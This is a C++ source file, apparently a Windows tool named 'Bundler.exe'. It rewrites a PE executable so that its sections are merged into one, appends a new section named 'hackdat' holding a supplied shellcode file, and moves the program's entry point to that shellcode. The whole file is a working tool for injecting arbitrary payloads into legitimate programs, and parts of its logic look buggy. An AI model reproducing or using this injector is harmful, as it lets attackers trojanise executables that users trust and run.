#include <tchar.h>
#include <iostream>
#include <Windows.h>

IMAGE_DOS_HEADER DosHeader;
IMAGE_NT_HEADERS NTHeader;
IMAGE_FILE_HEADER FileHeader;
IMAGE_OPTIONAL_HEADER OptionHeader;
IMAGE_SECTION_HEADER *pSectionHeader;

int _tmain(int argc, _TCHAR *argv[])
{
	if (argc > 2)
	{
		TCHAR *PEFileName = argv[1];
		TCHAR *SCFileName = argv[2];

		std::wcout << "PE FileName: " << PEFileName << std::endl;
		std::wcout << "SC FileName: " << SCFileName << std::endl;

		FILE *pPEFile;
		errno_t peFileError = _wfopen_s(&pPEFile, PEFileName, _T("rb+"));

		FILE *pShellcodeFile;
		errno_t scFileError = _wfopen_s(&pShellcodeFile, SCFileName, _T("rb"));

		// 打开文件判断
		if (scFileError != 0 || peFileError != 0)
		{
			std::cout << "Open File Error!" << std::endl;
			exit(0);
		}

		fseek(pShellcodeFile, 0, SEEK_END);
		DWORD lShellCodeSize = ftell(pShellcodeFile); // 获取整个文件的大小
		UCHAR *cShellCodeBuff = new UCHAR[lShellCodeSize];
		memset(cShellCodeBuff, 0, lShellCodeSize);
		fseek(pShellcodeFile, 0, SEEK_SET);
		fread(cShellCodeBuff, 1, lShellCodeSize, pShellcodeFile);
		fclose(pShellcodeFile);

		// 读取DOS头
		fread(&DosHeader, 1, sizeof(IMAGE_DOS_HEADER), pPEFile);
		// 判断DOS头PE指纹"MZ"，
		if (DosHeader.e_magic != IMAGE_DOS_SIGNATURE)
		{
			std::cout << "Can't Find 'MZ'!" << std::endl;
			// 关闭文件
			fclose(pPEFile);
			exit(0);
		}
		// 获取PE头地址
		LONG e_lfanew = DosHeader.e_lfanew;

		// 读取PE头，首先要将文件指针指到PE文件的起始位置
		fseek(pPEFile, e_lfanew, SEEK_SET);
		fread(&NTHeader, 1, sizeof(IMAGE_NT_HEADERS), pPEFile);

		if (NTHeader.Signature != IMAGE_NT_SIGNATURE)
		{
			std::cout << "Can't Find 'PE'!" << std::endl;
			// 关闭文件
			fclose(pPEFile);
			exit(0);
		}

		// 获取PE头、扩展PE头
		FileHeader = NTHeader.FileHeader;
		OptionHeader = NTHeader.OptionalHeader;

		DWORD FileAlignment = OptionHeader.FileAlignment;
		DWORD SectionAlignment = OptionHeader.SectionAlignment;
		WORD NumberOfSections = FileHeader.NumberOfSections;
		DWORD AddressOfEntryPoint = OptionHeader.AddressOfEntryPoint;
		DWORD SizeOfImage = OptionHeader.SizeOfImage;
		DWORD SizeOfHeaders = OptionHeader.SizeOfHeaders;

		// 获取节表
		pSectionHeader = (IMAGE_SECTION_HEADER *)calloc(NumberOfSections, sizeof(IMAGE_SECTION_HEADER));
		fseek(pPEFile, (e_lfanew + sizeof(IMAGE_NT_HEADERS)), SEEK_SET);
		fread(pSectionHeader, sizeof(IMAGE_SECTION_HEADER), NumberOfSections, pPEFile);

		// 判断内存对齐与文件对齐是否一致，如若不一致则需要进行修正内存对齐
		if (FileAlignment != SectionAlignment)
		{
			std::cout << "Fix Alignment ..." << std::endl;
			// 将文件对齐方式修改至与内存对齐一致
			NTHeader.OptionalHeader.FileAlignment = NTHeader.OptionalHeader.SectionAlignment;
			fseek(pPEFile, e_lfanew, SEEK_SET);
			fwrite(&NTHeader, sizeof(IMAGE_NT_HEADERS), 1, pPEFile);
			// 将每个节表的SizeOfRawData、Misc成员值进行内存对齐
			DWORD diffValue = 0;
			void *memoryList[10];
			DWORD sectionAlignmentValueList[10];
			for (int i = 0; i < NumberOfSections; (i++, pSectionHeader++))
			{
				DWORD SizeOfRawData = pSectionHeader->SizeOfRawData;
				DWORD VirtualSize = pSectionHeader->Misc.VirtualSize;
				DWORD PointerToRawData = pSectionHeader->PointerToRawData;
				// 取最大值
				DWORD maxValue = SizeOfRawData >= VirtualSize ? SizeOfRawData : VirtualSize;
				// 最大值除以SectionAlignment
				DWORD divValue = maxValue / SectionAlignment;
				// 向上取整，有余数就+1
				DWORD remainValue = maxValue % SectionAlignment;
				DWORD ceilValue = remainValue == 0 ? divValue : divValue + 1;
				// 计算出内存对齐之后的值
				DWORD sectionAlignmentValue = ceilValue * SectionAlignment;
				printf("Section: %s \nceil(max(%08x, %08x) / %08x) * %08x = %08x \n", pSectionHeader->Name, SizeOfRawData, VirtualSize, SectionAlignment, SectionAlignment, sectionAlignmentValue);

				// 修改SizeOfRawData、Misc的值
				pSectionHeader->SizeOfRawData = sectionAlignmentValue;
				pSectionHeader->Misc.VirtualSize = sectionAlignmentValue;
				// 修改PointerToRawData
				pSectionHeader->PointerToRawData += diffValue;
				diffValue = diffValue + (sectionAlignmentValue - SizeOfRawData);

				void *newMemory = calloc(1, sectionAlignmentValue);
				fseek(pPEFile, PointerToRawData, SEEK_SET);
				fread(newMemory, 1, SizeOfRawData, pPEFile);
				memoryList[i] = newMemory;
				sectionAlignmentValueList[i] = sectionAlignmentValue;
			}

			// 复原地址
			pSectionHeader = pSectionHeader - NumberOfSections;
			// 写入文件
			fseek(pPEFile, (e_lfanew + sizeof(IMAGE_NT_HEADERS)), SEEK_SET);
			fwrite(pSectionHeader, sizeof(IMAGE_SECTION_HEADER), NumberOfSections, pPEFile);

			// 填充节数据
			for (int i = 0; i < NumberOfSections; (i++, pSectionHeader++))
			{
				DWORD SizeOfRawData = pSectionHeader->SizeOfRawData;
				DWORD VirtualSize = pSectionHeader->Misc.VirtualSize;
				DWORD PointerToRawData = pSectionHeader->PointerToRawData;
				fseek(pPEFile, PointerToRawData, SEEK_SET);
				fwrite(memoryList[i], 1, sectionAlignmentValueList[i], pPEFile);
				free(memoryList[i]);
			}
		}

		// 合并节
		pSectionHeader = pSectionHeader - NumberOfSections;
		DWORD Characteristics;
		DWORD SizeOfRawData = 0;
		// 属性按位或运算
		for (int i = 0; i < NumberOfSections; (i++, pSectionHeader++))
		{
			Characteristics |= pSectionHeader->Characteristics;
			SizeOfRawData += pSectionHeader->SizeOfRawData;
		}
		pSectionHeader = pSectionHeader - NumberOfSections;
		pSectionHeader->Characteristics = Characteristics;
		pSectionHeader->SizeOfRawData = SizeOfRawData;
		pSectionHeader->Misc.VirtualSize = SizeOfRawData;
		DWORD PointerToRawData = pSectionHeader->PointerToRawData;
		DWORD VirtualAddress = pSectionHeader->VirtualAddress;

		// 写入文件
		fseek(pPEFile, (e_lfanew + sizeof(IMAGE_NT_HEADERS)), SEEK_SET);
		fwrite(pSectionHeader, sizeof(IMAGE_SECTION_HEADER), NumberOfSections, pPEFile);

		// 修改节数为1
		NTHeader.FileHeader.NumberOfSections = 1;
		fseek(pPEFile, e_lfanew, SEEK_SET);
		fwrite(&NTHeader, sizeof(IMAGE_NT_HEADERS), 1, pPEFile);

		// 新增一个节存放Shellcode
		pSectionHeader++;
		pSectionHeader->PointerToRawData = PointerToRawData + SizeOfRawData;
		pSectionHeader->VirtualAddress = VirtualAddress + SizeOfRawData;
		// Shellcode的大小除以SectionAlignment
		DWORD divValue = lShellCodeSize / SectionAlignment;
		// 向上取整，有余数就+1
		DWORD remainValue = lShellCodeSize % SectionAlignment;
		DWORD ceilValue = remainValue == 0 ? divValue : divValue + 1;
		DWORD sectionAlignmentValue = ceilValue * SectionAlignment;
		pSectionHeader->SizeOfRawData = sectionAlignmentValue;
		pSectionHeader->Misc.VirtualSize = sectionAlignmentValue;
		pSectionHeader->Characteristics = Characteristics;
		pSectionHeader->Name[1] = 0x68; // h
		pSectionHeader->Name[2] = 0x61; // a
		pSectionHeader->Name[3] = 0x63; // c
		pSectionHeader->Name[4] = 0x6b; // k
		pSectionHeader->Name[5] = 0x64; // d
		pSectionHeader->Name[6] = 0x61; // a
		pSectionHeader->Name[7] = 0x74; // t

		pSectionHeader--;

		// 写入文件
		fseek(pPEFile, (e_lfanew + sizeof(IMAGE_NT_HEADERS)), SEEK_SET);
		fwrite(pSectionHeader, sizeof(IMAGE_SECTION_HEADER), NumberOfSections, pPEFile);

		// 修改节数为2
		NTHeader.FileHeader.NumberOfSections = 2;
		NTHeader.OptionalHeader.SizeOfImage += sectionAlignmentValue;
		NTHeader.OptionalHeader.AddressOfEntryPoint = VirtualAddress + SizeOfRawData;
		fseek(pPEFile, e_lfanew, SEEK_SET);
		fwrite(&NTHeader, sizeof(IMAGE_NT_HEADERS), 1, pPEFile);

		// 扩容数据，插入Shellcode
		void *newMemory = calloc(1, sectionAlignmentValue);
		fseek(pPEFile, PointerToRawData + SizeOfRawData, SEEK_SET);
		memcpy(newMemory, cShellCodeBuff, lShellCodeSize);
		fwrite(newMemory, sectionAlignmentValue, 1, pPEFile);
		free(newMemory);

		// 最后关闭文件、释放内存
		fclose(pPEFile);
		free(pSectionHeader);
	}
	else
	{
		std::cout << "Usage: Bundler.exe PE_FILE SC_FILE" << std::endl;
	}
	return 0;
}
